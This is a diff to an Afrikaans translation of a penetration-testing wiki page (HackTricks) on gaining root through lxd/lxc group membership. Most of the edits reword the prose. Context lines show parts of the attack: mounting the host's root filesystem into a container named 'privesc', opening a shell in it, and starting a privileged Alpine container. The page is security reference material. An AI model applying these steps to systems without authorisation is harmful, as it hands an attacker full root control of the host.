@@ -2,17 +2,17 @@
 
 {{#include ../../../banners/hacktricks-training.md}}
 
-As jy aan die _**lxd**_- of _**lxc**_-groep behoort, kan jy root word
+As jy aan die _**lxd**_ **of** _**lxc**_ **group** behoort, kan jy root word
 
-## Exploiting sonder internet
+## Exploiting without internet
 
 ### Method 1
 
-Jy kan ’n alpine image vanaf ’n trusted repository download om saam met lxd te gebruik.
+Jy kan ’n alpine image aflaai om saam met lxd te gebruik vanaf ’n trusted repository.
 Canonical publiseer daaglikse builds op hul webwerf: [https://images.lxd.canonical.com/images/alpine/3.18/amd64/default/](https://images.lxd.canonical.com/images/alpine/3.18/amd64/default/)
-Kry eenvoudig beide **lxd.tar.xz** en **rootfs.squashfs** vanaf die nuutste build. (Die gidsnaam is die datum).
+Laai eenvoudig beide **lxd.tar.xz** en **rootfs.squashfs** van die nuutste build af. (Die directory-naam is die datum).
 
-Alternatiewelik kan jy hierdie distro builder op jou masjien installeer: [https://github.com/lxc/distrobuilder](https://github.com/lxc/distrobuilder) (volg die instruksies op die github):
+Alternatiewelik kan jy hierdie distro builder op jou machine installeer: [https://github.com/lxc/distrobuilder](https://github.com/lxc/distrobuilder) (volg die instruksies van GitHub):
 ```bash
 # Install requirements
 sudo apt update
@@ -51,8 +51,8 @@ lxc list
 lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
 ```
 > [!CAUTION]
-> Indien jy hierdie fout kry: _**Error: No storage pool found. Please create a new storage pool**_\
-> Voer **`lxd init`** uit en stel alle opsies op die verstekwaardes. Herhaal dan die vorige blok opdragte
+> As jy hierdie fout _**Error: No storage pool found. Please create a new storage pool**_ vind,\
+> Voer **`lxd init`** uit en stel al die opsies op default. Voer dan die vorige blok commands weer uit
 
 Uiteindelik kan jy die container uitvoer en root verkry:
 ```bash
@@ -62,7 +62,7 @@ lxc exec privesc /bin/sh
 ```
 ### Metode 2
 
-Bou ’n Alpine image en begin dit met die flag `security.privileged=true`, wat die container dwing om as root met die host filesystem te werk.
+Bou ’n Alpine image en begin dit met die vlag `security.privileged=true`, wat die container dwing om as root met die host se lêerstelsel te kommunikeer.
 ```bash
 # build a simple alpine image
 git clone https://github.com/saghul/lxd-alpine-builder
